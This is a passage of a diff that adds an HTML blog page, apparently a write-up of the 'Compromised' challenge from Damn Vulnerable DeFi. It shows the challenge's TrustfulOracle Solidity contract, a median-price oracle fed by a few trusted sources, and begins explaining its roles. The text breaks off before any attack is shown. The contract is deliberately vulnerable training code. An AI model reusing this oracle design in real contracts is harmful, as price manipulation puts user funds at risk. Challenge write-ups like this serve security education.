+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">TrustfulOracle</span> <span style="color:#00f">is</span> <span style="color:#000">AccessControlEnumerable</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">bytes32</span> <span style="color:#00f">public</span> <span style="color:#00f">constant</span> <span style="color:#000">TRUSTED_SOURCE_ROLE</span> = <span style="color:#000">keccak256</span>(<span style="color:#5a2">&#34;TRUSTED_SOURCE_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">bytes32</span> <span style="color:#00f">public</span> <span style="color:#00f">constant</span> <span style="color:#000">INITIALIZER_ROLE</span> = <span style="color:#000">keccak256</span>(<span style="color:#5a2">&#34;INITIALIZER_ROLE&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Source address =&gt; (symbol =&gt; price)
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">mapping</span>(<span style="color:#00f">address</span> =&gt; <span style="color:#00f">mapping</span> (<span style="color:#00f">string</span> =&gt; <span style="color:#00f">uint256</span>)) <span style="color:#00f">private</span> <span style="color:#000">pricesBySource</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">modifier</span> <span style="color:#000">onlyTrustedSource</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">hasRole</span>(<span style="color:#000">TRUSTED_SOURCE_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">modifier</span> <span style="color:#000">onlyInitializer</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">hasRole</span>(<span style="color:#000">INITIALIZER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">_</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">UpdatedPrice</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">source</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">string</span> <span style="color:#00f">indexed</span> <span style="color:#000">symbol</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">oldPrice</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">newPrice</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span>[] <span style="color:#00f">memory</span> <span style="color:#000">sources</span>, <span style="color:#00f">bool</span> <span style="color:#000">enableInitialization</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">sources</span>.<span style="color:#000">length</span> &gt; <span style="color:#3af">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span>(<span style="color:#00f">uint256</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">sources</span>.<span style="color:#000">length</span>; <span style="color:#000">i</span>++) {
+</span></span><span style="display:flex;"><span>            <span style="color:#000">_setupRole</span>(<span style="color:#000">TRUSTED_SOURCE_ROLE</span>, <span style="color:#000">sources</span>[<span style="color:#000">i</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> (<span style="color:#000">enableInitialization</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#000">_setupRole</span>(<span style="color:#000">INITIALIZER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// A handy utility allowing the deployer to setup initial prices (only once)
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">setupInitialPrices</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">address</span>[] <span style="color:#00f">memory</span> <span style="color:#000">sources</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">string</span>[] <span style="color:#00f">memory</span> <span style="color:#000">symbols</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span> <span style="color:#000">prices</span>
+</span></span><span style="display:flex;"><span>    ) 
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">public</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">onlyInitializer</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Only allow one (symbol, price) per source
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">require</span>(<span style="color:#000">sources</span>.<span style="color:#000">length</span> == <span style="color:#000">symbols</span>.<span style="color:#000">length</span> &amp;&amp; <span style="color:#000">symbols</span>.<span style="color:#000">length</span> == <span style="color:#000">prices</span>.<span style="color:#000">length</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span>(<span style="color:#00f">uint256</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">sources</span>.<span style="color:#000">length</span>; <span style="color:#000">i</span>++) {
+</span></span><span style="display:flex;"><span>            <span style="color:#000">_setPrice</span>(<span style="color:#000">sources</span>[<span style="color:#000">i</span>], <span style="color:#000">symbols</span>[<span style="color:#000">i</span>], <span style="color:#000">prices</span>[<span style="color:#000">i</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#000">renounceRole</span>(<span style="color:#000">INITIALIZER_ROLE</span>, <span style="color:#000">msg</span>.<span style="color:#000">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">postPrice</span>(<span style="color:#00f">string</span> <span style="color:#000">calldata</span> <span style="color:#000">symbol</span>, <span style="color:#00f">uint256</span> <span style="color:#000">newPrice</span>) <span style="color:#00f">external</span> <span style="color:#000">onlyTrustedSource</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">_setPrice</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">symbol</span>, <span style="color:#000">newPrice</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">getMedianPrice</span>(<span style="color:#00f">string</span> <span style="color:#000">calldata</span> <span style="color:#000">symbol</span>) <span style="color:#00f">external</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">_computeMedianPrice</span>(<span style="color:#000">symbol</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">getAllPricesForSymbol</span>(<span style="color:#00f">string</span> <span style="color:#00f">memory</span> <span style="color:#000">symbol</span>) <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">numberOfSources</span> = <span style="color:#000">getNumberOfSources</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span> <span style="color:#000">prices</span> = <span style="color:#00f">new</span> <span style="color:#00f">uint256</span>[](<span style="color:#000">numberOfSources</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span> (<span style="color:#00f">uint256</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">numberOfSources</span>; <span style="color:#000">i</span>++) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">address</span> <span style="color:#000">source</span> = <span style="color:#000">getRoleMember</span>(<span style="color:#000">TRUSTED_SOURCE_ROLE</span>, <span style="color:#000">i</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#000">prices</span>[<span style="color:#000">i</span>] = <span style="color:#000">getPriceBySource</span>(<span style="color:#000">symbol</span>, <span style="color:#000">source</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">prices</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">getPriceBySource</span>(<span style="color:#00f">string</span> <span style="color:#00f">memory</span> <span style="color:#000">symbol</span>, <span style="color:#00f">address</span> <span style="color:#000">source</span>) <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">pricesBySource</span>[<span style="color:#000">source</span>][<span style="color:#000">symbol</span>];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">getNumberOfSources</span>() <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">getRoleMemberCount</span>(<span style="color:#000">TRUSTED_SOURCE_ROLE</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_setPrice</span>(<span style="color:#00f">address</span> <span style="color:#000">source</span>, <span style="color:#00f">string</span> <span style="color:#00f">memory</span> <span style="color:#000">symbol</span>, <span style="color:#00f">uint256</span> <span style="color:#000">newPrice</span>) <span style="color:#00f">private</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">oldPrice</span> = <span style="color:#000">pricesBySource</span>[<span style="color:#000">source</span>][<span style="color:#000">symbol</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#000">pricesBySource</span>[<span style="color:#000">source</span>][<span style="color:#000">symbol</span>] = <span style="color:#000">newPrice</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">UpdatedPrice</span>(<span style="color:#000">source</span>, <span style="color:#000">symbol</span>, <span style="color:#000">oldPrice</span>, <span style="color:#000">newPrice</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_computeMedianPrice</span>(<span style="color:#00f">string</span> <span style="color:#00f">memory</span> <span style="color:#000">symbol</span>) <span style="color:#00f">private</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span> <span style="color:#000">prices</span> = <span style="color:#000">_sort</span>(<span style="color:#000">getAllPricesForSymbol</span>(<span style="color:#000">symbol</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// calculate median price
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">if</span> (<span style="color:#000">prices</span>.<span style="color:#000">length</span> % <span style="color:#3af">2</span> == <span style="color:#3af">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">uint256</span> <span style="color:#000">leftPrice</span> = <span style="color:#000">prices</span>[(<span style="color:#000">prices</span>.<span style="color:#000">length</span> / <span style="color:#3af">2</span>) - <span style="color:#3af">1</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">uint256</span> <span style="color:#000">rightPrice</span> = <span style="color:#000">prices</span>[<span style="color:#000">prices</span>.<span style="color:#000">length</span> / <span style="color:#3af">2</span>];
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">return</span> (<span style="color:#000">leftPrice</span> + <span style="color:#000">rightPrice</span>) / <span style="color:#3af">2</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#00f">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">return</span> <span style="color:#000">prices</span>[<span style="color:#000">prices</span>.<span style="color:#000">length</span> / <span style="color:#3af">2</span>];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_sort</span>(<span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span> <span style="color:#000">arrayOfNumbers</span>) <span style="color:#00f">private</span> <span style="color:#00f">pure</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>[] <span style="color:#00f">memory</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span> (<span style="color:#00f">uint256</span> <span style="color:#000">i</span> = <span style="color:#3af">0</span>; <span style="color:#000">i</span> &lt; <span style="color:#000">arrayOfNumbers</span>.<span style="color:#000">length</span>; <span style="color:#000">i</span>++) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">for</span> (<span style="color:#00f">uint256</span> <span style="color:#000">j</span> = <span style="color:#000">i</span> + <span style="color:#3af">1</span>; <span style="color:#000">j</span> &lt; <span style="color:#000">arrayOfNumbers</span>.<span style="color:#000">length</span>; <span style="color:#000">j</span>++) {
+</span></span><span style="display:flex;"><span>                <span style="color:#00f">if</span> (<span style="color:#000">arrayOfNumbers</span>[<span style="color:#000">i</span>] &gt; <span style="color:#000">arrayOfNumbers</span>[<span style="color:#000">j</span>]) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#00f">uint256</span> <span style="color:#000">tmp</span> = <span style="color:#000">arrayOfNumbers</span>[<span style="color:#000">i</span>];
+</span></span><span style="display:flex;"><span>                    <span style="color:#000">arrayOfNumbers</span>[<span style="color:#000">i</span>] = <span style="color:#000">arrayOfNumbers</span>[<span style="color:#000">j</span>];
+</span></span><span style="display:flex;"><span>                    <span style="color:#000">arrayOfNumbers</span>[<span style="color:#000">j</span>] = <span style="color:#000">tmp</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">arrayOfNumbers</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>When created, it sets the sources with different roles: <code>TRUSTED_SOURCE_ROLE</code> and <code>INITIALIZER_ROLE</code> (lines <code>41</code> and <code>45</code>). The <code>TRUSTED_SOURCE_ROLE</code> is checked with <code>onlyTrustedSource</code> modifier (line <code>21</code>), and it allows setting the price by calling the <code>postPrice</code> function (line <code>66</code>).
+These are the addresses that have this role (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L6-L10" target="_blank" rel="noopener noreffer ">setup</a>):</p>
+<ul>
+<li><code>0xA73209FB1a42495120166736362A1DfA9F95A105</code></li>
